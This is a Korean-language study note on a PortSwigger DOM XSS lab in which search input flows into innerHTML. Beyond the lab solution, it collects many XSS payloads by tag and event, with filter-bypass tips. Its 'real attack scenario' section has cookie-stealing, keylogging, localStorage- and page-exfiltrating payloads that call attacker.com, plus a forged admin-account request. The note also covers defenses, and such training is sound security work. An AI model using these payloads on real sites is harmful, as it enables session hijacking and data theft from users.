# Lab: DOM XSS in innerHTML sink using source location.search

## 개요

- **난이도**: Apprentice
- **주제**: Cross-Site Scripting (XSS) — DOM-based / innerHTML sink
- **링크**: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

## 목표

검색 기능의 `innerHTML` sink에 DOM XSS를 삽입하여 `alert()` 함수를 실행시킨다.

## 취약점 분석

페이지 내 JavaScript:

```javascript
var query = (new URLSearchParams(location.search)).get('search');
document.getElementById('searchMessage').innerHTML = query;
```

`location.search`에서 읽은 값을 `innerHTML`로 직접 삽입한다.

## `document.write` vs `innerHTML` 차이

003 랩의 `document.write`와 이번 `innerHTML`은 둘 다 DOM XSS sink지만 동작 방식이 다르다.

| 항목 | `document.write` (003) | `innerHTML` (004) |
|------|------------------------|-------------------|
| `<script>` 태그 실행 | O | **X (차단됨)** |
| 이벤트 핸들러 | O | O |
| `<img>`, `<svg>` 등 | O | O |
| 탐지 우회 난이도 | 낮음 | 낮음 |

`innerHTML`은 보안 이유로 `<script>` 태그를 실행하지 않는다. 대신 이벤트 핸들러나 `onerror` 등을 이용해야 한다.

## 공격 페이로드

```html
<img src=x onerror=alert(1)>
```

- `src=x` — 존재하지 않는 이미지 경로를 지정해 의도적으로 로드 실패를 유발
- `onerror=alert(1)` — 로드 실패 시 `onerror` 이벤트가 발생하며 `alert(1)` 실행

```
URL: https://victim.com/?search=<img src=x onerror=alert(1)>

innerHTML에 삽입되는 결과:
<img src=x onerror=alert(1)>

→ 이미지 로드 실패 → onerror 발동 → alert(1) 실행
```

---

## innerHTML에서 동작하는 태그와 이벤트 공격 모음

### 태그별 공격 페이로드

#### `<img>` — 이미지 로드 이벤트

```html
<!-- 로드 실패 유발 (가장 기본) -->
<img src=x onerror=alert(1)>

<!-- 화면 밖 이미지로 사용자 상호작용 없이 실행 -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- 마우스 오버 시 실행 -->
<img src="/valid.gif" onmouseover=alert(1)>
```

#### `<svg>` — SVG 벡터 이미지

```html
<!-- 로드 즉시 실행 -->
<svg onload=alert(1)>

<!-- 내부 요소 이용 -->
<svg><script>alert(1)</script></svg>

<!-- 애니메이션 이벤트 -->
<svg><animate onbegin=alert(1) attributeName=x></animate></svg>

<!-- 마우스 이벤트 -->
<svg onmouseover=alert(1)>hover me</svg>
```

#### `<iframe>` — 인라인 프레임

```html
<!-- 로드 완료 시 실행 -->
<iframe onload=alert(1)>

<!-- javascript: 프로토콜 -->
<iframe src="javascript:alert(1)">

<!-- srcdoc으로 HTML 직접 삽입 -->
<iframe srcdoc="<script>alert(1)</script>">
```

#### `<video>` / `<audio>` — 미디어 요소

```html
<!-- 재생 이벤트 -->
<video src=x onloadstart=alert(1)>
<video autoplay onplay=alert(1)><source src=x></video>

<!-- 로드 에러 -->
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 메타데이터 로드 완료 -->
<video onloadedmetadata=alert(1)><source src="/valid.mp4"></video>
```

#### `<input>` / `<textarea>` — 폼 입력 요소

```html
<!-- 포커스 시 (자동 포커스 조합) -->
<input autofocus onfocus=alert(1)>

<!-- 값 변경 시 -->
<input oninput=alert(1)>

<!-- 키 입력 시 -->
<input onkeydown=alert(1)>

<!-- 마우스 클릭 시 -->
<input onclick=alert(1) value="클릭">
```

#### `<body>` / `<details>` — 기타

```html
<!-- 페이지 로드 시 (innerHTML로는 제한적) -->
<body onload=alert(1)>

<!-- details 태그 토글 이벤트 -->
<details open ontoggle=alert(1)><summary>click</summary></details>

<!-- marquee 스크롤 이벤트 -->
<marquee onstart=alert(1)>text</marquee>
```

---

### 이벤트 핸들러 분류

#### 로드 이벤트 — 사용자 상호작용 불필요 (자동 실행)

| 이벤트 | 태그 | 설명 |
|--------|------|------|
| `onload` | `<svg>`, `<iframe>`, `<body>`, `<img>` | 요소 로드 완료 시 |
| `onerror` | `<img>`, `<video>`, `<audio>`, `<script>` | 리소스 로드 실패 시 |
| `onloadstart` | `<video>`, `<audio>` | 미디어 로드 시작 시 |
| `onloadedmetadata` | `<video>`, `<audio>` | 메타데이터 로드 완료 시 |
| `onbegin` | `<svg><animate>` | SVG 애니메이션 시작 시 |
| `ontoggle` | `<details open>` | details 열릴 때 자동 발화 |

> `open` 속성이 있는 `<details ontoggle>`, `autofocus`가 있는 `<input onfocus>` 등은
> 사용자 클릭 없이 **페이지 로드만으로 자동 실행**된다.

#### 마우스 이벤트 — 사용자 상호작용 필요

| 이벤트 | 설명 |
|--------|------|
| `onmouseover` | 마우스 올릴 때 |
| `onmouseout` | 마우스 벗어날 때 |
| `onclick` | 클릭 시 |
| `ondblclick` | 더블 클릭 시 |
| `onmousedown` | 마우스 버튼 누를 때 |
| `oncontextmenu` | 우클릭 메뉴 열 때 |

#### 키보드 이벤트

| 이벤트 | 설명 |
|--------|------|
| `onkeydown` | 키 누를 때 |
| `onkeyup` | 키 뗄 때 |
| `onkeypress` | 키 누르고 있을 때 (deprecated) |

#### 포커스 이벤트

| 이벤트 | 설명 |
|--------|------|
| `onfocus` | 포커스 받을 때 (`autofocus` 조합 시 자동) |
| `onblur` | 포커스 잃을 때 |

#### 입력 이벤트

| 이벤트 | 설명 |
|--------|------|
| `oninput` | 값 변경 시 |
| `onchange` | 값 확정 시 (Enter / 포커스 이탈) |
| `onpaste` | 붙여넣기 시 |

#### 드래그 / 터치 이벤트

| 이벤트 | 설명 |
|--------|------|
| `ondrag` | 드래그 중 |
| `ondrop` | 드롭 시 |
| `ontouchstart` | 터치 시작 시 (모바일) |
| `ontouchend` | 터치 끝날 때 (모바일) |

#### 애니메이션 / 전환 이벤트

| 이벤트 | 설명 |
|--------|------|
| `onanimationstart` | CSS 애니메이션 시작 시 |
| `onanimationend` | CSS 애니메이션 완료 시 |
| `ontransitionend` | CSS transition 완료 시 |

---

### 자동 실행 조합 페이로드 (사용자 상호작용 불필요)

실제 공격에서 가장 선호되는 페이로드 — 피해자가 아무것도 하지 않아도 실행됨.

```html
<!-- 1. img onerror — 가장 범용적 -->
<img src=x onerror=alert(1)>

<!-- 2. svg onload -->
<svg onload=alert(1)>

<!-- 3. details ontoggle (open 속성으로 자동 발화) -->
<details open ontoggle=alert(1)>

<!-- 4. input autofocus onfocus -->
<input autofocus onfocus=alert(1)>

<!-- 5. iframe onload -->
<iframe onload=alert(1)>

<!-- 6. SVG animate onbegin -->
<svg><animate onbegin=alert(1) attributeName=x></animate></svg>

<!-- 7. video onerror -->
<video src=x onerror=alert(1)>
```

### 실제 공격 시나리오 페이로드

```html
<!-- 쿠키 탈취 -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

<!-- 관리자 권한으로 계정 생성 요청 -->
<svg onload="fetch('/admin/create-user',{method:'POST',body:'username=hacker&role=admin'})">

<!-- 키로거 (입력 필드가 있는 페이지) -->
<img src=x onerror="document.addEventListener('keypress',e=>fetch('https://attacker.com/?k='+e.key))">

<!-- 현재 페이지 HTML 전체 탈취 -->
<svg onload="fetch('https://attacker.com/?html='+btoa(document.documentElement.innerHTML))">

<!-- localStorage 탈취 (세션 토큰 저장 시) -->
<img src=x onerror="fetch('https://attacker.com/?ls='+JSON.stringify(localStorage))">
```

---

## 핵심 정리

- `innerHTML`은 `<script>` 태그를 실행하지 않지만, 이벤트 핸들러를 통한 JS 실행은 가능하다.
- `onerror`, `onload`, `ontoggle(open)`, `onfocus(autofocus)` 등은 사용자 상호작용 없이 자동 실행된다.
- 삽입 가능한 태그와 이벤트 조합이 매우 다양하여 필터링 우회 방법이 풍부하다.
- **방어**:
  - `innerHTML` 대신 `textContent` / `createElement` 사용
  - DOMPurify 같은 라이브러리로 허용 태그/속성 화이트리스트 적용
  - CSP `script-src 'self'`로 인라인 이벤트 핸들러 차단

## 배운 점 및 추가 학습

### 1. 필터 우회 — 하나가 막히면 다른 것으로

WAF나 필터가 특정 태그/이벤트를 차단할 경우, 동일한 효과를 내는 대안이 매우 많다.

```
<img onerror> 차단  →  <svg onload> 시도
<svg> 차단          →  <iframe onload> 시도
onload 차단         →  onerror, ontoggle, onfocus 시도
```

공격자 입장에서 태그와 이벤트 조합의 경우의 수가 수십~수백 가지이기 때문에, 블랙리스트 방식의 필터는 완전한 방어가 어렵다.

### 2. `innerHTML` 사용이 불가피한 경우 — DOMPurify

불가피하게 HTML을 동적으로 삽입해야 한다면 DOMPurify로 정제한다.

```javascript
// 위험
element.innerHTML = userInput;

// 안전 — DOMPurify로 허용 태그/속성만 남기고 정제
element.innerHTML = DOMPurify.sanitize(userInput);
```

DOMPurify는 이벤트 핸들러(`on*`)를 모두 제거하고 안전한 태그/속성만 허용한다.

### 3. XSS 공격 단계 정리

```
[탐색]  어디에 입력값이 반영되는가? (source 파악)
   ↓
[분석]  어떤 코드가 처리하는가? (sink 파악: innerHTML / document.write / eval ...)
   ↓
[실험]  어떤 문자가 필터링되는가? (" ' < > / 등 테스트)
   ↓
[선택]  컨텍스트에 맞는 태그 + 이벤트 조합 선택
   ↓
[실행]  자동 실행 가능한 페이로드 우선 시도
```
